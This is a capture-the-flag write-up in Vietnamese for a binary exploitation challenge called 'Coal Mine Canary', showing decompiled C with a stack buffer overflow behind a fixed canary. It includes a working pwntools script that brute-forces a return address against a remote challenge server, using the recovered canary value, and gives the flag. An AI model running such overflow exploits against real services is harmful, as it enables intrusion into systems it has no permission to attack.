# Coal Mine Canary
Bài này hài nhất giải =D
## Analysis
Lỗi buffer overflow cùng với canary được cài đặt thủ công, nhiệm vụ là chạy được hàm `tweet_tweet`
```
void name_it(void) {
  int iVar1;
  size_t local_5c;
  char local_58 [32];
  undefined local_38 [32];
  undefined4 local_18;
  undefined4 local_14;
  int local_10;
  
  local_10 = 0;
  local_18 = global_birdy;
  local_14 = DAT_0804c050;
  printf("How many letters should its name have?\n> ");
  while ((local_10 < 0x20 && (read(0,local_58 + local_10,1), local_58[local_10] != '\n'))) {
    local_10 = local_10 + 1;
  }
  __isoc99_sscanf(local_58,&DAT_0804a10e,&local_5c);
  printf("And what\'s the name? \n> ");
                    /* Buffer overflow */
  read(0,local_38,local_5c);
  iVar1 = memcmp(&local_18,&global_birdy,8);
  if (iVar1 == 0) {
    printf("Ok... its name is %s\n",local_38);
    fflush(_stdout);
    return;
  }
  puts("*** Stack Smashing Detected *** : Are you messing with my canary?!");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```
```
void tweet_tweet(void) {
  char local_30 [32];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("\'flag.txt\' missing in the current directory!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_30,0x20,local_10);
  puts(local_30);
  fflush(_stdout);
  return;
}
```
## Solution
Do giá trị canary không đổi nên ta brute force và có được giá trị `NECGLSPQ`  
Đặc biệt, binary được cung cấp và binary trên server là khác nhau, vì vậy chúng ta cần brute force để tìm địa chỉ hàm `tweet_tweet` =D
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

for i in range(0x8049215+100, elf.sym['tweet_tweet']+300):
    con = remote("34.125.199.248", 5674)
    log.info("Trying: " + hex(i))
    con.sendlineafter(b"letters should its name have?", b"200")
    payload = b"A"*32 + b"NECGLSPQ" + b"B"*16 + p32(i) 
    con.sendafter(b"And what's the name?", payload)
    ans = con.recvall()
    if b"CTF" in ans:
        print(ans)
        break
```
## Flag
```
OSCTF{I_l0ve_my_c4n4ry}
```